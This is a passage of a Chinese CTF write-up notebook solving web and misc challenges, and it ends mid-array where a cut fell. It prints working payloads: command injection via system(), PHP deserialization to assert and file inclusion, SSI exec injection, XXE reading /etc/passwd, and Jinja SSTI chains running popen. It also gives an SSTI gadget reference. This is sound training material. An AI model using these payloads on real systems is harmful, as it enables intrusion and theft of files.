# 2021/3/2
## DJB veryphp

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("config.php");
class qwq
{
    function __wakeup(){
        die("Access Denied!");
    }
    static function oao(){
        show_source("config.php");
    }
}
$str = file_get_contents("php://input");
if(preg_match('/\`|\_|\.|%|\*|\~|\^|\'|\"|\;||\]|g|e|l|i|\//is',$str)){
    die("I am sorry but you have to leave.");
}else{
    extract($_POST);
}
if(isset($shaw_root)){
    if(preg_match('/^\-[a-e][^a-zA-Z0-8]<b>(.*)>{4}\D*?(abc.*?)p(hp)*\@R(s|r).$/', $shaw_root)&& strlen($shaw_root)===29){
        echo $hint;
    }else{
        echo "Almost there."."<br>";
    }
}else{
    echo "<br>"."Input correct parameters"."<br>";
    die();
}
if($ans===$SecretNumber){
    echo "<br>"."Congratulations!"."<br>";
    call_user_func($my_ans);
}
```
```plain
^表示开始位置
\-表示匹配-，所以第一位是-
[a-e]表示匹配a到e中的任意一个，这里我用了a
[^a-zA-Z0-8]表示匹配不是这个范围里的，所以是9
<b>就是匹配<b>
(.*)表示匹配除换行符外的所有字符，有0次或多次，这里暂且用1
>{4}表示匹配>>>>
\D*?表示匹配非数字0次或1次
(abc.*?)表示匹配abc
p就是匹配p
(hp)*表示匹配hp 0次或多次
\@表示匹配@
R就是匹配R
(s|r)表示匹配s或r
.表示匹配除换行符外的所有字符
$表示结束位置，所以最后一位是除换行符外的所有字符，这里我用了1
```
通过上述绕过正则
```plain
shaw root=-a9<b>11111111>>>>aabcphp@Rs1
```
出现hint：
![图片](https://uploader.shimo.im/f/wjKxcT2nebt90QO4.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
md5("shaw".($SecretNumber)."root")==166b47a5cb1ca2431a0edfcef200684f && strlen($SecretNumber)===5
```
接下来就是根据hint求出 $SecretNumber
```plain
<?php
//md5("shaw".($SecretNumber)."root")==166b47a5cb1ca2431a0edfcef200684f && strlen($SecretNumber)===5
for($SecretNumber=10000;$SecretNumber<99999;$SecretNumber++){
        $string = "shaw".($SecretNumber)."root";
        if (md5($string)== "166b47a5cb1ca2431a0edfcef200684f"){
                echo $SecretNumber;
                break;
        }
}
#21475
```
所以另 $ans=21475即可
![图片](https://uploader.shimo.im/f/BeJkoNYywfd5btq0.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
接下来就是执行call_user_func()函数,利用类的特性执行类中的方法qwq::oao
```
```plain
&my ans=qwq::oao
```
```plain
payload:shaw root=-a9<b>11111111>>>>aabcphp@Rs1&ans=21475&my ans=qwq::oao
```
## DJB spaceman

```plain
<?php
error_reporting(0);
highlight_file(__FILE__);
class spaceman
{
    public $username;
    public $password;
    public function __construct($username,$password)
    {
        $this->username = $username;
        $this->password = $password;
    }
    public function __wakeup()
    {
        if($this->password==='ctfshowvip')
        {
            include("flag.php");
            echo $flag;    
        }
        else
        {
            echo 'wrong password';
        }
    }
}
function filter($string){
    return str_replace('ctfshowup','ctfshow',$string);
}
$str = file_get_contents("php://input");
if(preg_match('/\_|\.|\]|\[/is',$str)){            
    die("I am sorry but you have to leave.");
}else{
    extract($_POST);
}
$ser = filter(serialize(new spaceman($user_name,$pass_word)));
$test = unserialize($ser);
?>
```
非预期解:
只要让password=ctfshowvip即可获得flag

```plain
pass word=ctfshowvip
```
预期解:反序列化逃逸(明天一定)
## 原谅4

```plain
<?php isset($_GET['xbx'])?system($_GET['xbx']):highlight_file(__FILE__);
```
考察三目运算符 ?前面是条件,条件成立执行system()，不成立执行highlight_file()
过滤了很多的命令用 ls /bin 查看哪些命令可用

![图片](https://uploader.shimo.im/f/Y3eCJMR0xOZkynON.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

可以用sh来执行命令

php -f 可以用来执行文件的内容

```plain
?xbx=sh /flag 2>%261
?xbx=php /flag
?xbx=php -f /flag
```
# 2021/3/3
## [MRCTF2020]PYWebsite

查看网页源代码，发现flag.php

![图片](https://uploader.shimo.im/f/SdLUSeG0oh1UZU3Y.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

访问flag.php

![图片](https://uploader.shimo.im/f/I9mJwlTHNdFIq2ts.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
X-Forwarded-For: 127.0.0.1
```
![图片](https://uploader.shimo.im/f/bt0xQP0mQGDMxOf7.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

## [NPUCTF2020]ReadlezPHP

```plain
<?php
#error_reporting(0);
class HelloPhp
{
public $a;
public $b;
public function __construct(){
$this->a = "Y-m-d h:i:s";
$this->b = "date";
}
public function __destruct(){
$a = $this->a;
$b = $this->b;
echo $b($a);
}
}
$c = new HelloPhp;
if(isset($_GET['source']))
{
highlight_file(__FILE__);
die(0);
}
@$ppp = unserialize($_GET["data"]);
```

```plain
<?php
#error_reporting(0);
class HelloPhp
{
    public $a = "";
    public $b = "";
    public function __construct()
    {
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct()
    {
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp();
$c->b = 'assert';
$c->a = 'phpinfo()';
$b = serialize($c);
echo $b;
?>
#O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}
```
![图片](https://uploader.shimo.im/f/WicQSBN43Q22uStz.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

# 2021/3/6
## f5也要lsb(misc)

注释里提示长度为6，直接爆破即可

![图片](https://uploader.shimo.im/f/UXaCFCLhGNA7BbC4.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

解压得到

![图片](https://uploader.shimo.im/f/apeDTHXxEdKn6GEG.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

图片上面标注了数字，既然是考察lsb，那就直接查看10.png也就是数字1图片的通道即可

![图片](https://uploader.shimo.im/f/qaErBFOVGBIRSwvI.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

发现zip的文件头，按顺序查看其它图片,得到zip的十六进制数据

```plain
504B03041400010000007C4C4D524A0409E41D0000001100000008000000666C61672E747874268FDB736D3D74D7654C946555EF139A56337B2E90EE9D79DE3A0632B2504B01023F001400010000007C4C4D524A0409E41D00000011000000080024000000000000002000000000000000666C61672E7478740A0020000000000001001800CBE6AA92A801D701F7A65B93A801D701A0FCEAE4A501D701504B050600000000010001005A000000430000000000
```
保存为zip，同样是爆破
![图片](https://uploader.shimo.im/f/Tm08Gtt9ARxyaIr8.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

那就查看BGR21通道的数据

![图片](https://uploader.shimo.im/f/gbGjvHTomkgIFe14.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

组合得到flag

![图片](https://uploader.shimo.im/f/DnJdakFe5CqJSM1u.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
#贝塔师傅的脚本
from PIL import Image
def check(path):
    img = Image.open(path)
    p1 = img.getpixel((0,0))
    p2 = img.getpixel((1,0))
    data = [p1[2], p1[1], p1[0], p2[2]]
    res = ''
    for i in data:
        b = str(bin(i))[2:].zfill(8)[5:7]
        res += b
    print(chr(int(res, 2))
check('1.png')
```
## eazy-unserialize

```php
<?php
include "mysqlDb.class.php";
class ctfshow{
    public $method;
    public $args;
    public $cursor;
    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
        $this->getCursor();
    }
    function getCursor(){
        global $DEBUG;
        if (!$this->cursor)
            $this->cursor = MySql::getInstance();
        if ($DEBUG) {
            $sql = "DROP TABLE IF  EXISTS  USERINFO";
            $this->cursor->Exec($sql);
            $sql = "CREATE TABLE IF NOT EXISTS USERINFO (username VARCHAR(64),
            password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8";
            $this->cursor->Exec($sql);
            $sql = "INSERT INTO USERINFO VALUES ('CTFSHOW', 'CTFSHOW', 'admin'), ('HHD', 'HXD', 'user')";
            $this->cursor->Exec($sql);
        }
    }
    function login() {
        list($username, $password) = func_get_args();
        $sql = sprintf("SELECT * FROM USERINFO WHERE username='%s' AND password='%s'", $username, md5($password));
        $obj = $this->cursor->getRow($sql);
        $data = $obj['role'];
        if ( $data != null ) {
            define('Happy', TRUE);
            $this->loadData($data);
        }
        else {
            $this->byebye("sorry!");
        }
    }
    function closeCursor(){
        $this->cursor = MySql::destroyInstance();
    }
    function lookme() {
        highlight_file(__FILE__);
    }
    function loadData($data) {
        if (substr($data, 0, 2) !== 'O:') {
            return unserialize($data);
        }
        return null;
    }
    function __destruct() {
        $this->getCursor();
        if (in_array($this->method, array("login", "lookme"))) {
            @call_user_func_array(array($this, $this->method), $this->args);
        }
        else {
            $this->byebye("fuc***** hacker ?");
        }
        $this->closeCursor();
    }
    function byebye($msg) {
        $this->closeCursor();
        header("Content-Type: application/json");
        die( json_encode( array("msg"=> $msg) ) );
    }
}
class Happy{
    public $file='flag.php';
    function __destruct(){
        if(!empty($this->file)) {
            include $this->file;
        }
    }
}
function ezwaf($data){
    if (preg_match("/ctfshow/",$data)){
        die("Hacker !!!");
    }
    return $data;
}
if(isset($_GET["w_a_n"])) {
    @unserialize(ezwaf($_GET["w_a_n"]));
} else {
    new CTFSHOW("lookme", array());
}
```
Happy这个类里，__destruct()这个方法存在文件包含漏洞，直接包含了file
```plain
class Happy{
    public $file='flag.php';
    function __destruct(){
        if(!empty($this->file)) {
            include $this->file;
        }
    }
}
```

```plain
<?php
class Happy{
    public $file='php://filter/convert.base64-encode/resource=/flag';
    
} 
$a = new Happy();
echo serialize($a);
?>
```
## eazy-unserialize-revenge(反序列化)

```plain
<?php
include "mysqlDb.class.php";
class ctfshow{
    public $method;
    public $args;
    public $cursor;
    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
        $this->getCursor();
    }
    function getCursor(){
        global $DEBUG;
        if (!$this->cursor)
            $this->cursor = MySql::getInstance();
        if ($DEBUG) {
            $sql = "DROP TABLE IF  EXISTS  USERINFO";
            $this->cursor->Exec($sql);
            $sql = "CREATE TABLE IF NOT EXISTS USERINFO (username VARCHAR(64),
            password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8";
            $this->cursor->Exec($sql);
            $sql = "INSERT INTO USERINFO VALUES ('CTFSHOW', 'CTFSHOW', 'admin'), ('HHD', 'HXD', 'user')";
            $this->cursor->Exec($sql);
        }
    }
    function login() {
        list($username, $password) = func_get_args();
        $sql = sprintf("SELECT * FROM USERINFO WHERE username='%s' AND password='%s'", $username, md5($password));
        $obj = $this->cursor->getRow($sql);
        $data = $obj['role'];
        if ( $data != null ) {
            define('Happy', TRUE);
            $this->loadData($data);
        }
        else {
            $this->byebye("sorry!");
        }
    }
    function closeCursor(){
        $this->cursor = MySql::destroyInstance();
    }
    function lookme() {
        highlight_file(__FILE__);
    }
    function loadData($data) {
        if (substr($data, 0, 2) !== 'O:') {
            return unserialize($data);
        }
        return null;
    }
    function __destruct() {
        $this->getCursor();
        if (in_array($this->method, array("login", "lookme"))) {
            @call_user_func_array(array($this, $this->method), $this->args);
        }
        else {
            $this->byebye("fuc***** hacker ?");
        }
        $this->closeCursor();
    }
    function byebye($msg) {
        $this->closeCursor();
        header("Content-Type: application/json");
        die( json_encode( array("msg"=> $msg) ) );
    }
}
class Happy{
    public $file='surprise.php';
    function __destruct(){
        if(!empty($this->file)) {
            include $this->file;
        }
    }
}
function ezwaf($data){
    if (preg_match("/ctfshow/",$data)){
        die("Hacker !!!");
    }
    return $data;
}
if(isset($_GET["w_a_n"])) {
    @unserialize(ezwaf($_GET["w_a_n"]));
} else {
    new CTFSHOW("lookme", array());
}
重新搜索
```
此题和上题一样，不做描述
## BJDCTF2020 EasySearch

考查知识点:  .swp源码泄露

SSI注入漏洞

python脚本编写

什么是SSI注入漏洞

```plain
SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。
SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。
从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。
```
```plain
（SSI注入的条件：
1.Web 服务器已支持SSI（服务器端包含）
2.Web 应用程序未对对相关SSI关键字做过滤
3.Web 应用程序在返回响应的HTML页面时，嵌入用户输入）
```
解题过程:

访问Index.php.swp获得网页的源码

![图片](https://uploader.shimo.im/f/GniysCHQV1din7yR.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
关键部分代码:
 if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
```
password开头前六位为 $admin即可登录到system
使用python处理即可

```plain
import hashlib
def md5(s):
    return hashlib.md5(s.encode('utf-8')).hexdigest()
for i in range(1, 10000000):
    if md5(str(i)).startswith('6d0bc1'):
        print(i)
        break
#2020666
```
登录抓包
![图片](https://uploader.shimo.im/f/9KfA33iTxNOZmdO7.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

访问一下，发现aaa也就是我们输入的用户名打印在了页面上。

![图片](https://uploader.shimo.im/f/4889CJP9wnGJfWqa.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

利用SSI注入漏洞，我们可以在username变量中传入ssi语句来远程执行系统命令。

<!--#exec cmd="ls ../"-->登录，访问network处的url

![图片](https://uploader.shimo.im/f/WxY5lba3ykxHDnug.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

访问即可得到flag

## [NCTF2019]True XML cookbook

考点:1.XXE注入

2.XXE内网探测

打开页面是登录框，抓包后发现xxe注入点

![图片](https://uploader.shimo.im/f/s8vJlzaIHbH0dhLg.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

使用payload进行攻击

```plain
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE hacker[
<!ENTITY a SYSTEM "file:///etc/passwd"> 
]>
<user><username>&a;</username><password>a</password></user>
```
尝试读flag，读不到
![图片](https://uploader.shimo.im/f/6xHMgVBX5TjNBV0x.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)读一下源码，没什么东西

![图片](https://uploader.shimo.im/f/kkkpUcxeRmzndFlz.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
<?php
/**
* autor: c0ny1
* date: 2018-2-7
*/
$USERNAME = 'admin'; //账号
$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //密码
$result = null;
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
try{
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$creds = simplexml_import_dom($dom);
$username = $creds->username;
$password = $creds->password;
if($username == $USERNAME && $password == $PASSWORD){
$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);
}else{
$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);
}
}catch(Exception $e){
$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",3,$e->getMessage());
}
header('Content-Type: text/html; charset=utf-8');
echo $result;
?>
```
读hosts但是没读到(不知道为啥网上的wp能读到就离谱)
![图片](https://uploader.shimo.im/f/KKdco82lJ0NlW6k2.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

```plain
#读取关键文件
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE hacker[
<!ENTITY a SYSTEM "file:///proc/net/arp"> 
]>
<user><username>&a;</username><password>a</password></user>
```
![图片](https://uploader.shimo.im/f/d7A3og01lgGBxxw3.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

发现一个主机ip，尝试读这个ip

![图片](https://uploader.shimo.im/f/3WbDA4EqsDs84Vvs.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

报错，可以进行C段扫描(后序补burp不太会用)，看wpC段为11，读到flag

![图片](https://uploader.shimo.im/f/jap2d4pFZ39hS8eD.png!thumbnail?fileGuid=H6gChgR9HdcCqkRq)

# 2021/3/8
## WEB 361 SSTI

```plain
payload:
?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

```plain
__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
current_app          应用上下文，一个全局变量。
request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1   	 get传参
request.values.x1 	 所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 post传参	(Content-Type:a/b)
request.json		 post传json  (Content-Type: application/json)
config               当前application的所有配置。此外，也可以这样{{    config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```
常用的过滤器
```plain

int()：将值转换为int类型；
float()：将值转换为float类型；
lower()：将字符串转换为小写；
upper()：将字符串转换为大写；
title()：把值中的每个单词的首字母都转成大写；
capitalize()：把变量值的首字母转成大写，其余字母转小写；
trim()：截取字符串前面和后面的空白字符；
wordcount()：计算一个长字符串中单词的个数；
reverse()：字符串反转；
replace(value,old,new)： 替换将old替换为new的字符串；
truncate(value,length=255,killwords=False)：截取length长度的字符串；
striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；
escape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。
safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；
list()：将变量列成列表；
string()：将变量转换成字符串；
join()：将一个序列中的参数值拼接成字符串。示例看上面payload；
abs()：返回一个数值的绝对值；
first()：返回一个序列的第一个元素；
last()：返回一个序列的最后一个元素；
format(value,arags,*kwargs)：格式化字符串。比如：{{ "%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!
length()：返回一个序列或者字典的长度；
sum()：返回列表内数值的和；
sort()：返回排序后的列表；
default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。
length()返回字符串的长度，别名是count
```


# 2021/3/20
## nepctf签到

```plain
import re
flag =[0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xfffffffffffffffffffbffffffffffff,0xfffffffffffffffffffbffffffffffff,0xfffffffffffffffffffbffffffffffff,0xfffffffffffffffffff9ffffffffffff,0xfffffffffffffffffff5f0001fffffff,0xfffffffffffffffe000407ffcfffffff,0xfffffffffffffff8fffffffff7ffffff,0xfffffffffffffff3fffffffff3ffffff,0xffffffffffffffcffffffffffbffffff,0xffffffffffffffdffffffffffbffffff,0xffffffffffffffdffffffffffbffffff,0xfffffffffffffffffffffffffdffffff,0xfffffffffffffffffffffffffdffffff,0xfffffffffffffffffffffffffdffffff,0xfffffffffffffffffffffffffcffffff,0xfffffffffffffffffffffffffcffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffff0000ffffffffffff,0xfffffffffffffffe7fff1f9fffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffe1fffffffffffdffffffffffff,0xffffff8cfffffffffffdffffffffffff,0xfff03fbf7ffffffffffbffffffffffff,0xffe79f3f3ffffffffffbffffffffffff,0xffefde7fbffffffffffbffffffffffff,0xffefeeff9ffffffffffbffffffffffff,0xffefe6ffdffffffffff9ffffffffffff,0xffcff6ffdffffffffffcffffffffffff,0xffdffaffcffffffffffe3fffffffffff,0xffdff8ffefffffffffff800fffffffff,0xffdff9ffefffffffffff0fffffffffff,0xffdffdffeffffffffffc7fffffffffff,0xffdffffff7fffffffff3ffffffffffff,0xffdffffff7fffffffff7ffffffffffff,0xffdffffff7ffffffffffffffffffffff,0xffdfff9fffffffffffffff7fffffffff,0xffffffbfffffffffffffff3fffffffff,0xffffff7ffffffffffffc1fbfffffffff,0xfffff7fffffffffffff9df9fffffffff,0xffffff7ffffffffffffbdfdfffffffff,0xffffff7ffffffffffffbdfdfffffffff,0xffffff9ffffffffffffbdf9fffffffff,0xffffffcffffffffffffbdfbfffffffff,0xffffffe3fffffffffffbdfbfffffffff,0xffffffc007fffffffffbdf3fffffffff,0xffffff1f83fffffffff9df7fffffffff,0xfffffe7ffffffffffffcdcffffffffff,0xfffffefffffffffffffe01ffffffffff,0xffffffffffffffffffffdfffffffffff,0xffffffffffffffffffffdfffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xfffffffff3ffffffffffffffffffffff,0xfffffff3e7ffffffffffffffffffffff,0xffffffc78ffffffffff8ffffffffffff,0xffffffb03fffffffffff3fffffffffff,0xffffff23ffffffffffff87ffffffffff,0xffffff787ffffffffffff0ffffffffff,0xffffff7f9ffffffffffffc7fffffffff,0xffffff7fc7fffffffffff1ffffffffff,0xffffff7ff3ffffffffffc7ffffffffff,0xffffffbffbffffffffff1fffffffffff,0xffffffcffbfffffffffcffffffffffff,0xffffffe7e7ffffffffe1ffffffffffff,0xfffffff80fffffffffefffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffe3ffffffffff,0xfffffffffffffffff01f89ffffffffff,0xffffffffffffffffc7cf3cffffffffff,0xffffffffffffffff9fee7effffffffff,0xfffffffffbffffff3ff6feffffffffff,0xfffffffffbffffff7ff2fe7fffffffff,0xfffffffffbffffff7ffaff7fffffffff,0xfffffffffbfffffefff8ff7fffffffff,0xfffffffffbfffffefffcff7fffffffff,0xfffffffffbfffffefffcff3fffffffff,0xfffffffffbfffffefffcffbfffffffff,0xfffffffffbfffffeffffffbfffffffff,0xfffffffffbffffffffffffbfffffffff,0xfffffffffbffffffffffffbfffffffff,0xfffffffffbffffffffffffffffffffff,0xfffffffffbffffffffffffffffffffff,0xfffffffffbffffffffffffffffffffff,0xfffffffffbffffffffffffffffffffff,0xfffffffffbfffffc00ffffffffffffff,0xfffffffffbfffffbff00001fffffffff,0xfffffffffbffffffffffffffffffffff,0xfffffffffbffffffffffffffffffffff,0xfffffffffbffffffffffffffffffffff,0xfffffffffbffffffffffffffffffffff,0xfffffffffbffffffffffffffffffffff,0xfffffffffbffffffffffffffffffffff,0xfffffffffbffffffffffffffffffffff,0xfffffffffffffffffffdfcffffffffff,0xfffffffffffffffffffbfeffffffffff,0xfffffffffffffffffff3fe7fffffffff,0xfffffffffffffffffff7ff7fffffffff,0xfffffffffffffffffff7ff7fffffffff,0xfffffffffffffffffff7ff7fffffffff,0xfffffffe1ffffffffff7ff7fffffffff,0xfffffff0fffffffffff7ff7fffffffff,0xffffff8ffffffffffff7feffffffffff,0xfffffff3fffffffffff9f0ffffffffff,0xfffffffcfffffffffffe07ffffffffff,0xfffffffe7fffffffffffffffffffffff,0xffffffff7fffffffffffffffffffffff,0xffffffffbfffffffffffffffffffffff,0xffffffffbfffffffffffffffffffffff,0xffffffff7fffffffffffffffffffffff,0xfffffffe7fffffffffffffffffffffff,0xffffffc0ffffffffffffffffffffffff,0xfffffffffffffffffffffff7ffffffff,0xfffffffffffffffffffffff7ffffffff,0xfffffffffffffffffffffff7ffffffff,0xfffffffffffffffffffffff7ffffffff,0xff8001fffffffffffffffff7ffffffff,0xffbffc00fffffffffffffff7ffffffff,0xff7ffffe1ffffffffffffff7ffffffff,0xff7fffffcffffffffffffff7ffffffff,0xff7fffffe7fffffffffffff7ffffffff,0xff3ffffff3fffffffffffff7ffffffff,0xffbffffffbfffffffffffff7ffffffff,0xff7ffffff3fffffffffffff7ffffffff,0xff83ffffe7fffffffffffff7ffffffff,0xfff83fffcffffffffffffff7ffffffff,0xffff80003ffffffffffffff7ffffffff,0xfffffffffffffffffffffff7ffffffff,0xfffffffffffffffffffffff7ffffffff,0xfffffffffffffffffffffff7ffffffff,0xffbffffffffffffffffffff7ffffffff,0xff9ffffffffffffffffffff7ffffffff,0xffdffffffffffffffffffff7ffffffff,0xffeffffffffffffffffffff7ffffffff,0xffeffffffffffffffffffff7ffffffff,0xfff7fffffffffffffffffff7ffffffff,0xfff7fffffffffffffffffff7ffffffff,0xfffbfffffffffffffffffff7ffffffff,0xfff9fffffffffffffffffff7ffffffff,0xfffdfffffffffffffffffff7ffffffff,0xfffcfffffffffffffffffff7ffffffff,0xfffefffffffffffffffffff7ffffffff,0xfffe7ffffffffffffffffff7ffffffff,0xffff3ffffffffffffffffff7ffffffff,0xffffbfffffffffffffffffffffffffff,0xffffbfffffffffffffffffffffffffff,0xffff9f003fffffffffffffffffffffff,0xffffc07f83ffffffffffffffffffffff,0xffff9fffffffffff8000001fffffffff,0xffff3fffffffffff3fffffcfffffffff,0xfffe7ffffffffffe7fffffe7ffffffff,0xfffcfffffffffffcfffffff3ffffffff,0xfff9fffffffffffc1ffffff3ffffffff,0xfff3fffffffffffe7fffffc7ffffffff,0xffe7ffffffffffff03ffe01fffffffff,0xffdffffffffffffff8000fffffffffff,0xff3fffffffffffffffffffffffffffff,0xfe7fffffffffffffffffffffffffffff,0xf8ffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xfffffffffffffffeffffffffffffffff,0xfffffffffffffffeffffffffffffffff,0xfffffffffffffffeffffffffffffffff,0xfffffffffffffffeffffffffffffffff,0xfffffffffffffffefffe03ffffffffff,0xffffffffffffffff7ffcf8ffffffffff,0xfbffffffffffffff7ff9feffffffffff,0xf3ffffffffffffff7ff3ff7fffffffff,0xe7ffffffffffffffbff7ffbfffffffff,0xefffffffffffffffbff7ffbfffffffff,0xefffffffffffffffbff7ffdfffffffff,0xeffffffffcffffffbff7ffdfffffffff,0xeffffffffeffffffbff7ffdfffffffff,0xe7fffc0ffeffffffbff7ffcfffffffff,0xf3fff9e07effffffbff7ffefffff